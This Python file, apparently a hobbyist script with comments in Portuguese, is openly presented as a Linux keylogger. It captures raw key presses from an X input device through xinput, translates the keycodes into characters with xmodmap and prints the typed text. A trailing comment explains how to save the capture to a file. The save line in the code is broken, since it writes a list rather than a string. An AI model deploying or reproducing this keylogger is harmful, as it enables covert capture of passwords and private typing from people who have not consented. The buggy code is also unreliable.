#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Arquivo: keylogger para linux
# Criado: Qua 04/Mai/2011 hs 14:01
# Last Change: Ter Set 09, 2014  05:03
# autor: bavardage (Ben Duffield)
# site: http://ardoris.wordpress.com
# changed by: Sérgio Luiz Araújo Silva
# download: https://gist.github.com/955569
# reference: http://blog.liquuid.net/2011/04/23/como-fazer-um-keyloggermouse-no-linux/

import re
import collections
from subprocess import *


def sanitize_keybinding(binding):
    d = {'space': ' ',
            'apostrophe': "'",
            'BackSpace': ' (<-)',
            'Return': '↵ \n',
            'period': '.',
            'Shift_L1': ' (shift1) ',
            'Shift_L2': ' (shift2) '}
    if binding in d:
        return d[binding]
    else:
        return binding


def get_keymap():
    keymap = {}
    table = Popen("xmodmap -pke", shell=True, bufsize=1, stdout=PIPE).stdout
    for line in table:
        m = re.match('keycode +(\d+) = (.+)', line.decode())
        if m and m.groups()[1]:
            keymap[m.groups()[0]] = sanitize_keybinding(m.groups()[1].split()[0])
    return keymap


if __name__ == '__main__':
    logger = Popen("xinput test 8", shell=True, bufsize=1, stdout=PIPE).stdout
    counts = collections.defaultdict(lambda : 0)
    output = []
    open('saida.txt','w').write(output)

    try:
        for line in logger:
            m = re.match('key press +(\d+)', line.decode())
            if m:
                keycode = m.groups()[0]
                counts[keycode] += 1
                output.append(keycode)
    except KeyboardInterrupt:
        keymap = get_keymap()
        print(output)
        print("---------------------")
        print(''.join(map(lambda x: keymap[x] if x in keymap else '?', output)))

# como gerar um arquivo com as teclas capturadas?
# Tem uma variavel output no fim do código que pode ser salva com um simples:
# open(‘saida.txt’,'w’).write(output) por exemplo


